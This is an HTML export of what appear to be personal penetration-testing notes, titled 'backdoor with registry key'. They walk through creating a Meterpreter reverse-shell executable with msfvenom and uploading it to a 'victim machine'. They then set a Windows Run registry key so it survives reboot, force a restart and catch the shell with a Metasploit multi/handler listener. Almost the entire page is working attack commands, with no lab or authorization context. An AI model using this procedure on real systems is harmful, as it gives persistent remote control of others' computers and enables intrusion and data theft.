<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>backdoor with registry key</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>backdoor with registry key</h1><br/><br />1. create a backdoor with msfvenom:<br />    <div class="codebox"><div class="codebox">root@kali:/home/kali#&nbsp;msfvenom&nbsp;-p&nbsp;windows/meterpreter/reverse_tcp&nbsp;LHOST=192.168.1.122&nbsp;LPORT=2345&nbsp;-f&nbsp;exe&nbsp;-o&nbsp;/home/kali/Desktop/exploit.exe</div></div><br />2. upload into the victim machine<br />    <div class="codebox"><div class="codebox">meterpreter&nbsp;&gt;&nbsp;pwd<br />meterpreter&nbsp;&gt;&nbsp;upload&nbsp;/home/kali/Desktop/exploit.exe&nbsp;.</div></div><br />    <a href=""><img src="images/867-1.png" alt="images/867-1.png" /></a><br />3. Edit the registry key with the reg command<br />    <code>reg setval -k [registry_key_path] -d [value_of_the key] -v [name_of_the_key]</code><br />    <div class="codebox"><div class="codebox">meterpreter&nbsp;&gt;&nbsp;reg&nbsp;setval&nbsp;-k&nbsp;HKLM\\software\\microsoft\\windows\\currentversion\\run&nbsp;-d&nbsp;&quot;C:\Users\danie\Desktop\exploit.exe&quot;&nbsp;-v&nbsp;exploit_daniele_&lt;3</div></div> <a href=""><img src="images/867-2.png" alt="images/867-2.png" /></a><br />    <a href=""><img src="images/867-3.png" alt="images/867-3.png" /></a><br />4. Restart the remote Windows machine to make effective the backdoor<br />    <div class="codebox"><div class="codebox">msf&nbsp;&gt;&nbsp;sessions&nbsp;-i&nbsp;&lt;Id-session&gt;<br />meterpreter&nbsp;&gt;&nbsp;shell<br />C:\Users\danie\Desktop&gt;&nbsp;shutdown&nbsp;/r&nbsp;/f</div></div><br />    <a href=""><img src="images/867-4.png" alt="images/867-4.png" /></a><br />5. come back to metasploit and check if there are working listeners <br />    <div class="codebox"><div class="codebox">jobs&nbsp;-lshow&nbsp;option</div></div><br />    if not we have to create a listener on metasploit<br />    <div class="codebox"><div class="codebox">use&nbsp;exploit/multi/handler<br />set&nbsp;lhost&nbsp;&lt;lhost&gt;<br />set&nbsp;lport&nbsp;&lt;lport&gt;<br />set&nbsp;payload&nbsp;&lt;same-payload-placed-in-the-victim-machine&gt;<br />run</div></div><br />6. press ENTER and interact with the backdoor session</div>
</body>
</html>
